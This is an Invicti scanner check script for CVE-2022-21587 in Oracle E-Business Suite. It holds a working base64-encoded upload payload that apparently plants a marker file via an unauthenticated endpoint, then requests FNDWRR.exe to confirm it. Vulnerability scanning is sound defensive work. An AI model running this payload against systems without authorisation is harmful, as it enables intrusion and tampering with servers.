/* 
*  This Singular Security Check script was generated by Invicti Standard 
*  For more information about Custom Script Checks and samples, please refer to documentation: 
*  https://www.invicti.com/support/custom-security-checks-scripting/ 
*/ 

var attacks = [
    {
        id: '8653c454-9469-4872-8111-cf6892ea8078',
        name: 'CVE-2022-21587'
    }
];

function decode_base64 (s)
{
    var e = {}, i, k, v = [], r = '', w = String.fromCharCode;
    var n = [[65, 91], [97, 123], [48, 58], [43, 44], [47, 48]];

    for (z in n)
    {
        for (i = n[z][0]; i < n[z][1]; i++)
        {
            v.push(w(i));
        }
    }
    for (i = 0; i < 64; i++)
    {
        e[v[i]] = i;
    }

    for (i = 0; i < s.length; i+=72)
    {
        var b = 0, c, x, l = 0, o = s.substring(i, i+72);
        for (x = 0; x < o.length; x++)
        {
            c = e[o.charAt(x)];
            b = (b << 6) + c;
            l += 6;
            while (l >= 8)
            {
                r += w((b >>> (l -= 8)) % 256);
            }
         }
    }
    return r;
}

function analyze(response) {
    logUI("CVE-2022-21587 custom script started!");
    var re = /(https?:\/\/)([^:^\/]*)(:?\d*)(.*)?/;
	var capture = response.Uri.match(re);
	var url = capture[1].toString() + capture[2].toString() + capture[3].toString();

    var request = new Request(url + '/OA_HTML/BneViewerXMLService?bne:uueupload=TRUE');
    var body = decode_base64("LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5WnNNcm8wVXNBUVlMRFpHdgpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImJuZTp1dWV1cGxvYWQiCgpUUlVFCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeVpzTXJvMFVzQVFZTERaR3YKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ1cGxvYWRmaWxlbmFtZSI7ZmlsZW5hbWU9InRlc3QuemlwIgoKYmVnaW4gNzc3IHRlc3QuemlwCk00JEwjISEwYGBgYChgI0IpMUU5PU45Ulc9UGBgYCdcYGBgISNgYGBgK0JYTytCWE8rQlhPK0JYTytCWE8KTTFEVTc3VEFPOzY0TzNXKUE4VlFFN1Q1IjRSVUE8J2BRK1YtTzs2VU87Ql1TOFcpSTwnMVMrVzFYOlQ5LgpNMSU9MjRCWVA7IzcsTDBLIiwhMSZYM1UvXDUuJFVOJUIjOEMyNCk8QlhATlhFXzlKYFI4LVIxNjpNXTwuCk1XPFlST0ZdQj0vPic0MiU6K1ZMVlM8M11SKyQiMjBaLF1ISTI+KSUjXi8zNkVdQDtZMylWQFFPMUhOIUEKTUZCJjxRL0hXTz45KFc/LSZOTTo6XS8lVC4xPDtHJygyPU02Wl8wJT5LKmBWMk9UYDQkTCFgQ1xgJWBgYApNYGBAYC4oRSY1RVZZRys9V2BgYGA/UGBgYCQsYClgYGBgYGBgYGBgQGBgYGBgYGBgYCJYTitSWE4rUlhOCk0rUlhOK1JYTitUOS01VV0oO1ZVRStUXVI4Ni1MOTVdJTBFLE04NyFQLDJdQztWVU07VlhPPFYtUjo3IVQKTTxSXVQ+Jk0mM0QxNzRFKE48JlAqYCJgYGBgYGBgYCRgJmAiOkpFQC0vM0s5YDBgYGBgYGBgYGBgYGBgYAo7YGBgYGBgITAyUDQmYGBgYGBgJGBgMCI1YGBgYFZgYGBgYGBgCmAKZW5kCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeVpzTXJvMFVzQVFZTERaR3YtLQo=");
    request.Body = body;
    request.Headers.Add('Content-Type','multipart/form-data; boundary=----WebKitFormBoundaryZsMro0UsAQYLDZGv');
    var response = invicti.request(request);
    if (response.statusCode == 200 && response.Body.indexOf('<bne:message bne:type="ERROR" bne:text="Cannot be logged in as GUEST." bne:cause="" bne:action="" />') > -1) {
        response = invicti.request(url + '/OA_CGI/FNDWRR.exe');
        if (response.statusCode = 200 && response.Body.indexOf('testing-for-CVE-2022-21587') > -1){
            logUI("CVE-2022-21587 custom script ended!");
            return new Vulnerability("6feaec9a-d5b4-4440-b1b5-fee442a1476e");
        }
    }
    logUI("CVE-2022-21587 custom script ended!");
}